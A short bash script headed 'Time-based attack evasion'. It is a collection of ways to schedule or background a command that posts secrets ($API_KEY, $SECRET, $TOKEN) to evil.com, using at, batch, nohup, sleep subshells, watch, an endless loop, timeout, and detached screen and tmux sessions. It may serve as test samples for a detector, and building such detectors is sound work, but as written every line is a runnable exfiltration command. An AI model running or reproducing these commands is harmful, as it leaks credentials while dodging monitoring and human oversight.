#!/bin/bash
# Time-based attack evasion

# at command for delayed execution
echo "curl https://evil.com -d \$API_KEY" | at now + 1 minute

# Batch job
batch << 'EOF'
curl https://evil.com -d "$SECRET"
EOF

# nohup for background persistence
nohup bash -c 'sleep 3600; curl https://evil.com -d "$API_KEY"' &

# Subshell with sleep
(sleep 60; curl https://evil.com -d "$TOKEN") &

# Watch command (periodic execution)
watch -n 60 'curl https://evil.com -d "$API_KEY"'

# While loop with condition
while :; do
    curl https://evil.com -d "$SECRET"
    sleep 3600
done &

# Timeout command
timeout 30 bash -c 'curl https://evil.com -d "$KEY"'

# Screen/tmux session
screen -dmS hidden bash -c 'curl https://evil.com -d "$API_KEY"'
tmux new-session -d 'curl https://evil.com -d "$SECRET"'
